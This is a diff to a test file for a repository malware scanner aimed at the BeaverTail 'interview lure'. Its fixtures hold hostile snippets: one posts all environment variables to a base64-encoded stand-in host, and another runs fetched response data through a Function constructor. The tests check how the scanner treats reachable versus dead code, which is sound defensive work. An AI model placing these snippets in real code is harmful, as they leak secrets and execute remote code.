@@ -35,6 +35,8 @@ describe('selfScan — Contagious-Interview / BeaverTail lure', () => {
 }`,
         '.vscode/settings.json': `{ "files.autoSave": "afterDelay", "editor.wordWrap": "off", "security.workspace.trust.enabled": false }`,
         '.env': `NODE_ENV=development\nAUTH_API=${b64('https://ip-checking-x.example.invalid/api')}\n`,
+        // prepare runs this → it requires the controller, so the controller is auto-run-reachable (LIVE).
+        'server/server.js': `const auth = require('./controllers/auth'); auth.init();`,
         'server/controllers/auth.js': `const axios = require('axios');\naxios.post(api, { ...process.env }, { headers: { 'x-app-request': 'ip-check' } });`,
         'server/routes/api/auth.js': `function v(response){ const executor = new Function("require", response.data); executor(require); }`,
         'src/index.js': `export const add = (a, b) => a + b;`,
@@ -98,6 +100,41 @@ describe('selfScan — Contagious-Interview / BeaverTail lure', () => {
         expect(r.findings.some((f) => /outbound HTTP/i.test(f.label))).toBe(false); // fetch() is normal
         expect(r.findings.some((f) => /Function\(\) constructor/.test(f.label))).toBe(false); // templating is normal
         expect(r.findings.some((f) => /environment variables/i.test(f.label))).toBe(false); // env→child is normal
+    });
+
+    it('reports the dead remote-exec file as an FYI without changing the verdict', async () => {
+        const r = await selfScan(malicious);
+        // routes/api/auth.js is never reached by a trigger → dead → must NOT be in the verdict findings…
+        expect(r.findings.some((f) => f.file === 'server/routes/api/auth.js')).toBe(false);
+        // …but it IS surfaced as a heads-up.
+        expect(r.fyi.some((f) => f.file === 'server/routes/api/auth.js' && /request\/response data/.test(f.label))).toBe(true);
+    });
+
+    it('FYI on dead code is informational only — danger reachable by nothing keeps the repo SAFE', async () => {
+        const dangerInDeadCodeOnly = repo({
+            // No lifecycle hooks, no folderOpen task → nothing auto-runs → everything is dead.
+            'package.json': JSON.stringify({ name: 'lib', scripts: { build: 'tsc', test: 'jest' } }),
+            'src/index.js': `export const add = (a, b) => a + b;`,
+            // Dangerous, but unreachable: imported by nothing the build/install runs.
+            'src/admin/exec.js': `function run(response){ const f = new Function('require', response.data); f(require); }`,
+            'src/admin/exfil.js': `const axios = require('axios'); axios.post(url, { ...process.env });`,
+        });
+        const r = await selfScan(dangerInDeadCodeOnly);
+        expect(r.worst).toBe(Verdict.SAFE); // dead danger never drives the verdict
+        expect(r.what).toHaveLength(0); // no alarming narrative
+        expect(r.fyi.some((f) => f.file === 'src/admin/exec.js')).toBe(true);
+        expect(r.fyi.some((f) => f.file === 'src/admin/exfil.js' && /environment variables/.test(f.label))).toBe(true);
+    });
+
+    it('does not raise FYI on legit templating / vendored dead code', async () => {
+        const legit = repo({
+            'package.json': JSON.stringify({ name: 'app', scripts: { build: 'tsc' } }),
+            'src/template.js': `export const compile = (src) => new Function('ctx', src);`, // legit templating
+            '.yarn/releases/yarn.cjs': `new Function(s, body);`, // vendored → skipped
+        });
+        const r = await selfScan(legit);
+        expect(r.worst).toBe(Verdict.SAFE);
+        expect(r.fyi).toHaveLength(0);
     });
 
     it('returns SAFE with no findings for a clean repo', async () => {
